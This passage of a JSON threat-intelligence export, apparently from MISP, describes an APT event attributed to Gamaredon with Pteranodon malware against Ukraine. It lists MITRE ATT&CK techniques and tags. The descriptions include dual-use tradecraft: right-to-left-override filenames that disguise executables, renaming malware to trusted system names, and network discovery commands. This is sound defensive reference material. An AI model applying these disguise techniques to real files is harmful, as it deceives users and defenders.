Execution](https:\/\/attack.mitre.org\/techniques\/T1035).","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"478aa214-2ca7-4ec0-9978-18798e514790","tag_id":"806","meta":{"external_id":["CAPEC-550"],"kill_chain":["mitre-attack:persistence","mitre-attack:privilege-escalation"],"mitre_data_sources":["Windows Registry","Process monitoring","Process command-line parameters","Windows event logs"],"mitre_platforms":["Windows"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1050","https:\/\/capec.mitre.org\/data\/definitions\/550.html","https:\/\/technet.microsoft.com\/en-us\/library\/cc772408.aspx","https:\/\/technet.microsoft.com\/en-us\/sysinternals\/bb963902","https:\/\/docs.microsoft.com\/windows\/security\/threat-protection\/auditing\/event-4697","https:\/\/docs.microsoft.com\/windows\/security\/threat-protection\/use-windows-event-forwarding-to-assist-in-intrusion-detection"]},"local":false},{"id":"1247","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"Masquerading - T1036","tag_name":"misp-galaxy:mitre-attack-pattern=\"Masquerading - T1036\"","description":"Masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. Several different variations of this technique have been observed.\n\nOne variant is for an executable to be placed in a commonly trusted directory or given the name of a legitimate, trusted program. Alternatively, the filename given may be a close approximation of legitimate programs or something innocuous. An example of this is when a common system utility or program is moved and renamed to avoid detection based on its usage.(Citation: FireEye APT10 Sept 2018) This is done to bypass tools that trust executables by relying on file name or path, as well as to deceive defenders and system administrators into thinking a file is benign by associating the name with something that is thought to be legitimate.\n\nA third variant uses the right-to-left override (RTLO or RLO) character (U+202E) as a means of tricking a user into executing what they think is a benign file type but is actually executable code. RTLO is a non-printing character that causes the text that follows it to be displayed in reverse.(Citation: Infosecinstitute RTLO Technique) For example, a Windows screensaver file named\u00a0<code>March 25 \\u202Excod.scr<\/code> will display as <code>March 25 rcs.docx<\/code>. A JavaScript file named <code>photo_high_re\\u202Egnp.js<\/code> will be displayed as <code>photo_high_resj.png<\/code>. A common use of this technique is with spearphishing attachments since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.\u00a0\n\n### Windows\nIn another variation of this technique, an adversary may use a renamed copy of a legitimate utility, such as rundll32.exe. (Citation: Endgame Masquerade Ball) An alternative case occurs when a legitimate utility is moved to a different directory and also renamed to avoid detections based on system utilities executing from non-standard paths. (Citation: F-Secure CozyDuke)\n\nAn example of abuse of trusted locations in Windows would be the <code>C:\\Windows\\System32<\/code> directory. Examples of trusted binary names that can be given to malicious binares include \"explorer.exe\" and \"svchost.exe\".\n\n### Linux\nAnother variation of this technique includes malicious binaries changing the name of their running process to that of a trusted or benign process, after they have been launched as opposed to before. (Citation: Remaiten)\n\nAn example of abuse of trusted locations in Linux  would be the <code>\/bin<\/code> directory. Examples of trusted binary names that can be given to malicious binares include \"rsyncd\" and \"dbus-inotifier\". (Citation: Fysbis Palo Alto Analysis)  (Citation: Fysbis Dr Web Analysis)","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"42e8de7b-37b2-4258-905a-6897815e58e0","tag_id":"807","meta":{"external_id":["T1036"],"kill_chain":["mitre-attack:defense-evasion"],"mitre_data_sources":["File monitoring","Process monitoring","Binary file metadata"],"mitre_platforms":["Linux","macOS","Windows"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1036","https:\/\/www.fireeye.com\/blog\/threat-research\/2018\/09\/apt10-targeting-japanese-corporations-using-updated-ttps.html","https:\/\/resources.infosecinstitute.com\/spoof-using-right-to-left-override-rtlo-technique-2\/","https:\/\/blog.trendmicro.com\/trendlabs-security-intelligence\/plead-targeted-attacks-against-taiwanese-government-agencies-2\/","https:\/\/securelist.com\/zero-day-vulnerability-in-telegram\/83800\/","https:\/\/www.endgame.com\/blog\/how-hunt-masquerade-ball","https:\/\/www.f-secure.com\/documents\/996508\/1030745\/CozyDuke","https:\/\/www.welivesecurity.com\/2016\/03\/30\/meet-remaiten-a-linux-bot-on-steroids-targeting-routers-and-potentially-other-iot-devices\/","https:\/\/researchcenter.paloaltonetworks.com\/2016\/02\/a-look-into-fysbis-sofacys-linux-backdoor\/","https:\/\/vms.drweb.com\/virus\/?i=4276269","https:\/\/twitter.com\/ItsReallyNick\/status\/1055321652777619457"]},"local":false},{"id":"1181","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"Account Manipulation - T1098","tag_name":"misp-galaxy:mitre-attack-pattern=\"Account Manipulation - T1098\"","description":"Account manipulation may aid adversaries in maintaining access to credentials and certain permission levels within an environment. Manipulation could consist of modifying permissions, modifying credentials, adding or changing permission groups, modifying account settings, or modifying how authentication is performed. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to subvert password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"a10641f4-87b4-45a3-a906-92a149cb2c27","tag_id":"808","meta":{"external_id":["T1098"],"kill_chain":["mitre-attack:credential-access","mitre-attack:persistence"],"mitre_data_sources":["Authentication logs","API monitoring","Windows event logs","Packet capture"],"mitre_platforms":["Windows"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1098","https:\/\/docs.microsoft.com\/windows\/device-security\/auditing\/event-4738","https:\/\/blog.stealthbits.com\/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM","https:\/\/github.com\/gentilkiwi\/mimikatz\/issues\/92"]},"local":false},{"id":"905","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"File and Directory Discovery - T1083","tag_name":"misp-galaxy:mitre-attack-pattern=\"File and Directory Discovery - T1083\"","description":"Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. \n\n### Windows\n\nExample utilities used to obtain this information are <code>dir<\/code> and <code>tree<\/code>. (Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the Windows API.\n\n### Mac and Linux\n\nIn Mac and Linux, this kind of discovery is accomplished with the <code>ls<\/code>, <code>find<\/code>, and <code>locate<\/code> commands.","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"7bc57495-ea59-4380-be31-a64af124ef18","tag_id":"778","meta":{"external_id":["T1083"],"kill_chain":["mitre-attack:discovery"],"mitre_data_sources":["File monitoring","Process monitoring","Process command-line parameters"],"mitre_platforms":["Linux","macOS","Windows"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1083","http:\/\/blog.jpcert.or.jp\/2016\/01\/windows-commands-abused-by-attackers.html"]},"local":false},{"id":"1038","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"Network Share Discovery - T1135","tag_name":"misp-galaxy:mitre-attack-pattern=\"Network Share Discovery - T1135\"","description":"Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\n### Windows\n\nFile sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder)\n\n[Net](https:\/\/attack.mitre.org\/software\/S0039) can be used to query a remote system for available shared drives using the <code>net view \\\\remotesystem<\/code> command. It can also be used to query shared drives on the local system using <code>net share<\/code>.\n\nAdversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.\n\n### Mac\n\nOn Mac, locally mounted shares can be viewed with the <code>df -aH<\/code> command.","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"3489cfc5-640f-4bb3-a103-9137b97de79f","tag_id":"776","meta":{"external_id":["T1135"],"kill_chain":["mitre-attack:discovery"],"mitre_data_sources":["Process monitoring","Process command-line parameters","Network protocol analysis","Process use of network"],"mitre_platforms":["macOS","Windows"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1135","https:\/\/en.wikipedia.org\/wiki\/Shared_resource","https:\/\/technet.microsoft.com\/library\/cc770880.aspx"]},"local":false},{"id":"1013","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"Network Service Scanning - T1046","tag_name":"misp-galaxy:mitre-attack-pattern=\"Network Service Scanning - T1046\"","description":"Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system.","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"e3a12395-188d-4051-9a16-ea8e14d07b88","tag_id":"775","meta":{"external_id":["T1046"],"kill_chain":["mitre-attack:discovery"],"mitre_data_sources":["Netflow\/Enclave netflow","Network protocol analysis","Packet capture","Process command-line parameters","Process use of network"],"mitre_platforms":["Linux","Windows","macOS"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1046"]},"local":false},{"id":"994","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"Remote File Copy - T1105","tag_name":"misp-galaxy:mitre-attack-pattern=\"Remote File Copy - T1105\"","description":"Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Files may be copied from an external adversary-controlled system through the Command and Control channel to bring tools into the victim network or through alternate protocols with another tool such as [FTP](https:\/\/attack.mitre.org\/software\/S0095). Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\n\nAdversaries may also copy files laterally between internal victim systems to support Lateral Movement with remote Execution using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with [Windows Admin Shares](https:\/\/attack.mitre.org\/techniques\/T1077) or [Remote Desktop Protocol](https:\/\/attack.mitre.org\/techniques\/T1076).","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"e6919abc-99f9-4c6c-95a5-14761e7b2add","tag_id":"809","meta":{"external_id":["T1105"],"kill_chain":["mitre-attack:command-and-control","mitre-attack:lateral-movement"],"mitre_data_sources":["File monitoring","Packet capture","Process use of network","Netflow\/Enclave netflow","Network protocol analysis","Process monitoring"],"mitre_platforms":["Linux","macOS","Windows"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1105","https:\/\/arxiv.org\/ftp\/arxiv\/papers\/1408\/1408.1136.pdf"]},"local":false},{"id":"896","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"Replication Through Removable Media - T1091","tag_name":"misp-galaxy:mitre-attack-pattern=\"Replication Through Removable Media - T1091\"","description":"Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"3b744087-9945-4a6f-91e8-9dbceda417a4","tag_id":"810","meta":{"external_id":["T1091"],"kill_chain":["mitre-attack:lateral-movement","mitre-attack:initial-access"],"mitre_data_sources":["File monitoring","Data loss prevention"],"mitre_platforms":["Windows"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1091"]},"local":false},{"id":"1191","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"Automated Collection - T1119","tag_name":"misp-galaxy:mitre-attack-pattern=\"Automated Collection - T1119\"","description":"Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of [Scripting](https:\/\/attack.mitre.org\/techniques\/T1064) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as [File and Directory Discovery](https:\/\/attack.mitre.org\/techniques\/T1083) and [Remote File Copy](https:\/\/attack.mitre.org\/techniques\/T1105) to identify and move files.","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"30208d3e-0d6b-43c8-883e-44462a514619","tag_id":"789","meta":{"external_id":["T1119"],"kill_chain":["mitre-attack:collection"],"mitre_data_sources":["File monitoring","Data loss prevention","Process command-line parameters"],"mitre_platforms":["Linux","macOS","Windows"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1119"]},"local":false},{"id":"890","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"Data from Local System - T1005","tag_name":"misp-galaxy:mitre-attack-pattern=\"Data from Local System - T1005\"","description":"Sensitive data can be collected from local system sources, such as the file system or databases of information residing on the system prior to Exfiltration.\n\nAdversaries will often search the file system on computers they have compromised to find files of interest. They may do this using a [Command-Line Interface](https:\/\/attack.mitre.org\/techniques\/T1059), such as [cmd](https:\/\/attack.mitre.org\/software\/S0106), which has functionality to interact with the file system to gather information. Some adversaries may also use [Automated Collection](https:\/\/attack.mitre.org\/techniques\/T1119) on the local system.","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"3c4a2599-71ee-4405-ba1e-0e28414b4bc5","tag_id":"790","meta":{"external_id":["T1005"],"kill_chain":["mitre-attack:collection"],"mitre_data_sources":["File monitoring","Process monitoring","Process command-line parameters"],"mitre_platforms":["Linux","macOS","Windows"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1005"]},"local":false},{"id":"841","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"Data from Network Shared Drive - T1039","tag_name":"misp-galaxy:mitre-attack-pattern=\"Data from Network Shared Drive - T1039\"","description":"Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration.\n\nAdversaries may search network shares on computers they have compromised to find files of interest. Interactive command shells may be in use, and common functionality within [cmd](https:\/\/attack.mitre.org\/software\/S0106) may be used to gather information.","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"ae676644-d2d2-41b7-af7e-9bed1b55898c","tag_id":"792","meta":{"external_id":["T1039"],"kill_chain":["mitre-attack:collection"],"mitre_data_sources":["File monitoring","Process monitoring","Process command-line parameters"],"mitre_platforms":["Linux","macOS","Windows"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1039"]},"local":false},{"id":"900","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"Data from Removable Media - T1025","tag_name":"misp-galaxy:mitre-attack-pattern=\"Data from Removable Media - T1025\"","description":"Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration.\n\nAdversaries may search connected removable media on computers they have compromised to find files of interest. Interactive command shells may be in use, and common functionality within [cmd](https:\/\/attack.mitre.org\/software\/S0106) may be used to gather information. Some adversaries may also use [Automated Collection](https:\/\/attack.mitre.org\/techniques\/T1119) on removable media.","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"1b7ba276-eedc-4951-a762-0ceea2c030ec","tag_id":"811","meta":{"external_id":["T1025"],"kill_chain":["mitre-attack:collection"],"mitre_data_sources":["File monitoring","Process monitoring","Process command-line parameters"],"mitre_platforms":["Linux","macOS","Windows"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1025"]},"local":false},{"id":"844","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"Custom Command and Control Protocol - T1094","tag_name":"misp-galaxy:mitre-attack-pattern=\"Custom Command and Control Protocol - T1094\"","description":"Adversaries may communicate using a custom command and control protocol instead of encapsulating commands\/data in an existing [Standard Application Layer Protocol](https:\/\/attack.mitre.org\/techniques\/T1071). Implementations include mimicking well-known protocols or developing custom protocols (including raw sockets) on top of fundamental protocols provided by TCP\/IP\/another standard network stack.","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"f72eb8a8-cd4c-461d-a814-3f862befbf00","tag_id":"795","meta":{"external_id":["T1094"],"kill_chain":["mitre-attack:command-and-control"],"mitre_data_sources":["Packet capture","Netflow\/Enclave netflow","Process use of network","Process monitoring","Host network interface","Network intrusion detection system","Network protocol analysis"],"mitre_platforms":["Linux","macOS","Windows"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1094","https:\/\/arxiv.org\/ftp\/arxiv\/papers\/1408\/1408.1136.pdf"]},"local":false},{"id":"1118","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"Multi-hop Proxy - T1188","tag_name":"misp-galaxy:mitre-attack-pattern=\"Multi-hop Proxy - T1188\"","description":"To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"7d751199-05fa-4a72-920f-85df4506c76c","tag_id":"812","meta":{"external_id":["T1188"],"kill_chain":["mitre-attack:command-and-control"],"mitre_data_sources":["Network protocol analysis","Netflow\/Enclave netflow"],"mitre_platforms":["Linux","macOS","Windows"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1188"]},"local":false},{"id":"798","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"Exfiltration Over Command and Control Channel - T1041","tag_name":"misp-galaxy:mitre-attack-pattern=\"Exfiltration Over Command and Control Channel - T1041\"","description":"Data exfiltration is performed over the Command and Control channel. Data is encoded into the normal communications channel using the same protocol as command and control communications.","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"92d7da27-2d91-488e-a00c-059dc162766d","tag_id":"798","meta":{"external_id":["T1041"],"kill_chain":["mitre-attack:exfiltration"],"mitre_data_sources":["User interface","Process monitoring"],"mitre_platforms":["Linux","macOS","Windows"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1041","https:\/\/arxiv.org\/ftp\/arxiv\/papers\/1408\/1408.1136.pdf"]},"local":false},{"id":"1127","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"Automated Exfiltration - T1020","tag_name":"misp-galaxy:mitre-attack-pattern=\"Automated Exfiltration - T1020\"","description":"Data, such as sensitive documents, may be exfiltrated through the use of automated processing or [Scripting](https:\/\/attack.mitre.org\/techniques\/T1064) after being gathered during Collection. \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over Command and Control Channel](https:\/\/attack.mitre.org\/techniques\/T1041) and [Exfiltration Over Alternative Protocol](https:\/\/attack.mitre.org\/techniques\/T1048).","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"774a3188-6ba9-4dc4-879d-d54ee48a5ce9","tag_id":"797","meta":{"external_id":["T1020"],"kill_chain":["mitre-attack:exfiltration"],"mitre_data_sources":["File monitoring","Process monitoring","Process use of network"],"mitre_platforms":["Linux","macOS","Windows"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1020"]},"local":false}]}],"Object":[],"Tag":[{"id":"129","name":"APT","colour":"#0cbb05","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"198","name":"A\u0441tor: Gamaredon","colour":"#47384b","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"199","name":"Malware: Pteranodon","colour":"#8aea76","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"200","name":"Victim: Ukraine","colour":"#531314","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"726","name":"misp-galaxy:mitre-attack-pattern=\"Spearphishing Link - T1192\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"727","name":"misp-galaxy:mitre-attack-pattern=\"Spearphishing Attachment - T1193\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"728","name":"misp-galaxy:mitre-attack-pattern=\"Command-Line Interface - T1059\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"766","name":"misp-galaxy:mitre-attack-pattern=\"Scheduled Task - T1053\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"729","name":"misp-galaxy:mitre-attack-pattern=\"Scripting - T1064\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"800","name":"misp-galaxy:mitre-attack-pattern=\"User Execution - T1204\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"801","name":"misp-galaxy:mitre-attack-pattern=\"XSL Script Processing - T1220\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"802","name":"misp-galaxy:mitre-attack-pattern=\"Windows Management Instrumentation - T1047\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"803","name":"misp-galaxy:mitre-attack-pattern=\"Hidden Files and Directories - T1158\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"765","name":"misp-galaxy:mitre-attack-pattern=\"Local Job Scheduling - T1168\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"767","name":"misp-galaxy:mitre-attack-pattern=\"Registry Run Keys \/ Startup Folder - T1060\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"804","name":"misp-galaxy:mitre-attack-pattern=\"Startup Items - T1165\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"805","name":"misp-galaxy:mitre-attack-pattern=\"Shortcut Modification - T1023\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"806","name":"misp-galaxy:mitre-attack-pattern=\"New Service - T1050\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"807","name":"misp-galaxy:mitre-attack-pattern=\"Masquerading - T1036\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"808","name":"misp-galaxy:mitre-attack-pattern=\"Account Manipulation - T1098\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"778","name":"misp-galaxy:mitre-attack-pattern=\"File and Directory Discovery - T1083\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"776","name":"misp-galaxy:mitre-attack-pattern=\"Network Share Discovery - T1135\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"775","name":"misp-galaxy:mitre-attack-pattern=\"Network Service Scanning - T1046\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"809","name":"misp-galaxy:mitre-attack-pattern=\"Remote File Copy - T1105\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"810","name":"misp-galaxy:mitre-attack-pattern=\"Replication Through Removable Media - T1091\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"789","name":"misp-galaxy:mitre-attack-pattern=\"Automated Collection - T1119\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"790","name":"misp-galaxy:mitre-attack-pattern=\"Data from Local System - T1005\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"792","name":"misp-galaxy:mitre-attack-pattern=\"Data from Network Shared Drive - T1039\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"811","name":"misp-galaxy:mitre-attack-pattern=\"Data from Removable Media - T1025\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"795","name":"misp-galaxy:mitre-attack-pattern=\"Custom Command and Control Protocol - T1094\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"812","name":"misp-galaxy:mitre-attack-pattern=\"Multi-hop Proxy - T1188\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"798","name":"misp-galaxy:mitre-attack-pattern=\"Exfiltration Over Command and Control Channel - T1041\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null},{"id":"797","name":"misp-galaxy:mitre-attack-pattern=\"Automated Exfiltration - T1020\"","colour":"#0088cc","exportable":true,"user_id":"0","hide_tag":false,"numerical_value":null}]}}]}